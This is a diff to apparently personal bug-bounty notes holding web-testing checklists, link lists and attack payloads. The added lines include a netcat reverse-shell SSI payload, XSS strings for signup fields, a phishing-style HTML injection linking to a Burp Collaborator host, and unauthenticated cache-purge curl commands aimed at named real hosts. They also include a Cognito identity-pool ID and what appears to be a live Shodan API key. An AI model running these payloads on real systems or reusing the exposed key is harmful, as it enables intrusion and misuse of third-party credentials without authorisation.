@@ -4,7 +4,10 @@ https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md
 https://github.com/ianare/exif-samples/blob/master/jpg/Konica_Minolta_DiMAGE_Z3.jpg
 methodology https://readmedium.com/what-after-recon-part-01-bug-bounty-methodology-25ff3705a738
 https://github.com/gigachad80/grep-backURLs
+https://github.com/Vaidik-pandya/Checklist-Guide-resources/blob/main/100-Ways-for-IDOR.md
 https://dorkengine.github.io/
+https://app.trinetlayer.com/ghostjs
+
 
 Broken Access Control
 Cryptographic Failures
@@ -16,6 +19,19 @@ Identification and Authentication Failures
 Software and Data Integrity Failures
 Security Logging and Monitoring Failures
 Server-Side Request Forgery (SSRF)
+
+
+FOR Recon 1-2 days for
+>>> so First Scan with your Script...in 0000> fast but test//// in Binscan > deep not fully rested.....................
+
+shodan> hNVgvlIoWTFFgppjoKVQFF3bHnfqWFJq
+>>> also scan with JS Hunt | both 2 script run 
+>> Some manual recone go DEEP
+
+Than go with your chack list and also read artical and other reports
+
+
+USe Gemini for finds and recon also it will play good role
 
 
 https://securitytoolkits.com/tools/cve-search
@@ -39,6 +55,9 @@ recon part
 12. osint
 13. grayhatwarfare.com (finding buckets)
 14. https://phonebook.cz/#<find urls like wayback>
+
+
+
 
 
 ## Burp Proxy Domains: Don’t just stick to the scope filter in Burp. Monitor all traffic — sometimes you’ll catch unknown domains not found through tools.
@@ -139,7 +158,7 @@ INVITE FUNCTIONALITY CHECKLIST
 
 
 ====================================================================================================================================
-=====================================
+
 AI / CHATBOT SECURITY TESTING CHECKLIST
 =====================================
 
@@ -280,6 +299,21 @@ Signup page Vulnerabilities
 24. Brute Force Protection
 25. overwrite account associated with email via android application
 
+
+
+-------------------------------------------------------------------------------------------------------
+Email obsecure vulnerability
+------------------------------->>
+
+
+if there is email verification while creating the account there may be find this vulnerability
+have account with ksummer901@gmail.com of victim so try to create account 
+with k.summer901@gmail.com
+
+if you success to create account here do ATO
+
+
+
 Payload for Username field : <svg/onload=confirm(1)>
 Payload for Email field : “><svg/onload=confirm(1)>”@x.y
 
@@ -318,6 +352,17 @@ RESET PASSWORD TESTING
 
 
 
+-------------------------------------------------------------------------------------------------------------------------------------------
+Text injection/Comment Injection
+---------------->>
+
+<p>Free Hacking Course: <a href="https://vrqg4oh2zp7u30wbp1zb3feycpif64.burpcollaborator.net">https://kongsec.io</a></p>
+<p>You will be redirected to the new address in five seconds.</p>
+<p>If you see this message for more than 5 seconds, please click on the link above!</p>
+
+
+
+
 ------------------------------------------------------------------------------------------------------
 Business Logic Vulnerability
 ------------------------------>
@@ -326,7 +371,7 @@ https://medium.com/@Az3m/business-logic-checklist-eafde7f86dc2
 
 
 ----------------------------------------------------------------------------------------------------------
-How we can Perform a DOS attack to a target application?
+How we can Perform application level DoS?
 ---------------------------------------------------------->>
 1. Long String Based DoS attacks
 · Try to input long password when registering an account in the input field
@@ -494,8 +539,11 @@ Unuath cache purging
 -------------------------->
 check if cache: HIT in response for for it 
 
-curl -S -D - https://jobs.myntra.com/splash/splash.js
-curl -X PURGE https://jobs.myntra.com/splash/splash.js
+curl -S -D - https://hire101.hackerearth.com
+curl -X PURGE https://hire101.hackerearth.com
+
+https://medium.com/@raia39499/misconfiguration-in-google-service-unauth-cache-purging-fa7b67449482
+
 
 ## Web cache deception
 
@@ -507,7 +555,7 @@ here is required INTENTITY_POOL_ID
 
 Search form any where 
 
-- page.domain:"gov.uk" AND filename:"env.js"
+- page.domain:"test.cyberauditor.in" AND filename:"env.js"
 env.js
 main.js
 app.js
@@ -546,7 +594,7 @@ curl -s https://cognito-identity.eu-west-1.amazonaws.com/ \
   -H "Content-Type: application/x-amz-json-1.1" \
   -H "X-Amz-Target: AWSCognitoIdentityService.GetId" \
   -d '{
-    "IdentityPoolId": "eu-west-1:3330d35d-e9c6-4774-a736-661a2cceef14"
+    "IdentityPoolId": "us-east-1:37817d17-8481-4be6-8f56-c6cf233e3003"
   }' | jq
 
 ✅ Expected:
@@ -881,6 +929,30 @@ try to user real username and wrong password to login it may be 1000 time if the
 
 
 
+--------------------------------------------------------------------------------------------------------------------------------------------
+Server Side Include Injection (SSI Injection)
+----------------------------------------------->>
+
+main try to find .shtml there may bee can find this
+
+How to exploit
+Print a date
+<!--#echo var="DATE_LOCAL" -->
+
+Print all the variabels
+<!--#printenv -->
+
+Include a file
+<!--#include file="includefile.html" -->
+
+Doing a reverse shell
+<!--#exec cmd="mkfifo /tmp/foo;nc IP PORT 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
+
+
+
+
+
+
 
 ------------------------------------------------------------------------------------------------------------------------------------------
 Other Vulnerabilities
@@ -928,7 +1000,7 @@ Other Vulnerabilities
 ------------------------------------------------------------------------------------------------------------------------------------------
 
 ========================================
-SSRF (Server-Side Request Forgery) Notes
+SSRF (Server-Side Request Forgery) Notes: for read Note/ PDFs 
 ========================================
 
 ----------------------------------------
@@ -1441,3 +1513,336 @@ Ticket trick
 
 if any comapany ha
 having there help-desk section, if issuing ticket by sending mail than you should try to find on that try send on this issue mail if you are receiving on you own email so that's vulnerability
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+## IIS SERVER EXPLOITATION CHECKLIST
+----------------------------------->>
+
+1. IIS VERSION DETECTION
+Identify IIS version before testing.
+
+Tools:
+nmap -sV -p80,443 <target>
+whatweb <target>
+
+Look for:
+Microsoft-IIS/7.5
+Microsoft-IIS/8.5
+Microsoft-IIS/10.0
+
+
+2. IIS TILDE ENUMERATION (8.3 FILENAME DISCLOSURE)
+
+IIS may expose short filenames like:
+admin~1
+config~1
+backup~1
+
+Tools:
+
+Burp Extension:
+IIS Tilde Enumeration Scanner
+
+CLI Tool:
+shortscan <URL> -F
+
+Example:
+shortscan https://target.com -F
+
+This will:
+- Detect 8.3 filename vulnerability
+- Fuzz hidden directories
+- Reveal hidden resources
+
+
+3. DISCOVER HIDDEN FILES
+
+If tilde enumeration works, guess real filenames.
+
+Examples:
+admin~1 → admin.aspx
+conf~1 → config.aspx
+log~1 → log.txt
+
+Common IIS files:
+web.config
+global.asax
+trace.axd
+elmah.axd
+
+
+4. SENSITIVE CONFIGURATION FILES
+
+Check access to:
+web.config
+global.asax
+appsettings.json
+trace.axd
+elmah.axd
+
+These may reveal:
+- connection strings
+- database credentials
+- debug information
+
+
+5. WEBDAV MISCONFIGURATION
+
+Check if WebDAV is enabled.
+
+Send request:
+OPTIONS / HTTP/1.1
+
+Look for methods:
+DAV
+PROPFIND
+
+
+uske dekha tha isko
+PUT
+DELETE
+
+If enabled, test file upload:
+PUT /test.txt
+
+
+6. IIS VERB TAMPERING
+
+Test different HTTP verbs:
+
+GET
+POST
+PUT
+DELETE
+OPTIONS
+TRACE
+PROPFIND
+
+Example:
+DELETE /admin
+
+
+7. FILE UPLOAD BYPASS
+
+Test dangerous extensions:
+
+file.asp;.jpg
+shell.aspx;.jpg
+test.asp::$DATA
+
+
+8. PATH TRAVERSAL
+
+Test traversal payloads:
+
+../
+..%5c
+..%255c
+
+Example:
+/../../web.config
+
+
+9. MISCONFIGURED ERROR PAGES
+
+Visit invalid pages:
+invalidpage.aspx
+
+Check for:
+stack traces
+file paths
+framework versions
+
+
+10. INFORMATION DISCLOSURE HEADERS
+
+Look for headers:
+
+X-Powered-By: ASP.NET
+X-AspNet-Version
+
+These reveal framework versions.
+
+
+11. TRACE METHOD TEST
+
+Test TRACE method:
+
+curl -X TRACE https://target.com
+
+If enabled → possible Cross Site Tracing (XST).
+
+
+12. ASP.NET DEBUG ENDPOINTS
+
+Check:
+
+/trace.axd
+/elmah.axd
+
+These may expose logs and internal requests.
+
+
+13. BACKUP FILE DISCOVERY
+
+Check for:
+
+web.config.bak
+web.config.old
+web.config~
+backup.zip
+site.bak
+
+
+14. IIS DEFAULT FILES
+
+Check:
+
+/iisstart.htm
+/default.asp
+/default.aspx
+
+These confirm IIS server.
+
+
+IMPORTANT NOTES
+
+If 8.3 filename enumeration works:
+- Hidden admin panels may be discovered
+- Backup files may be revealed
+- Hidden APIs may be exposed
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+==============================
+CRYPTOGRAPHY / SSL-TLS CHECKLIST
+==============================
+
+1. Identify SSL/TLS Enabled Ports
+--------------------------------
+Command:
+nmap -sV --reason -PN -n --top-ports 100 <target>
+
+Description:
+- Identify services running on common ports
+- Detect SSL/TLS-enabled ports like 443, 465, 993, etc.
+
+
+2. Check Certificate Information & Ciphers
+------------------------------------------
+Command:
+nmap --script ssl-cert,ssl-enum-ciphers -p 443,465 <target>
+
+Description:
+- Check certificate validity and expiry
+- Identify weak ciphers (RC4, DES, etc.)
+- Detect supported TLS versions
+
+
+3. Test SSL/TLS Renegotiation Vulnerability
+-------------------------------------------
+Command:
+openssl s_client -connect <target:port>
+
+After connection, type:
+HEAD / HTTP/1.1
+R
+
+Description:
+- Check for insecure client-initiated renegotiation
+- If server responds abnormally, it may be vulnerable
+
+
+4. Deep SSL/TLS Scan using sslyze
+---------------------------------
+Command:
+sslyze --regular <target:ip>
+
+Description:
+- Detect supported protocols (SSLv2, SSLv3, TLS1.0, etc.)
+- Identify weak cipher suites
+- Check renegotiation issues
+
+
+5. Test using testssl.sh
+------------------------
+Command:
+./testssl.sh <target.com>
+
+Description:
+- Comprehensive SSL/TLS testing tool
+- Detect vulnerabilities (POODLE, Heartbleed, etc.)
+- Analyze cipher strength and protocol support
+
+
+6. Check for POODLE Vulnerability
+---------------------------------
+Command:
+nmap -sV --version-light -Pn --script ssl-poodle -p 443 -iL subdomain.txt
+
+Additional Commands:
+nmap --script ssl-enum-ciphers -p 443 <sub.target.com>
+curl -v3 -X HEAD <url>
+
+Description:
+- Detect SSLv3 support
+- If SSLv3 is enabled, system may be vulnerable to POODLE
+
+
+7. External SSL Testing
+-----------------------
+Tool:
+https://www.ssllabs.com/ssltest/
+
+Description:
+- Provides SSL security grade (A+, A, B, etc.)
+- Detects chain issues and vulnerabilities
+- Validates configuration externally
+
+
+8. Scan Common SSL Ports
+------------------------
+Command:
+nmap -sV --version-light -Pn --script ssl-poodle -p 21,25,443,465,587,993,995 -iL subdomain.txt
+
+Description:
+- Scan all common SSL/TLS ports:
+  21   - FTPS
+  25   - SMTP (STARTTLS)
+  443  - HTTPS
+  465  - SMTPS
+  587  - SMTP Submission
+  993  - IMAPS
+  995  - POP3S
+
+
+==============================
+FINAL SECURITY RECOMMENDATIONS
+==============================
+
+- Disable SSLv2 and SSLv3
+- Use strong ciphers (AES-GCM preferred)
+- Enforce TLS 1.2 or TLS 1.3
+- Fix certificate chain issues
+- Disable insecure renegotiation
+
+==============================
+END OF CHECKLIST
+==============================
+
+
+
+
+
+
+
+
+
+
+
+
+
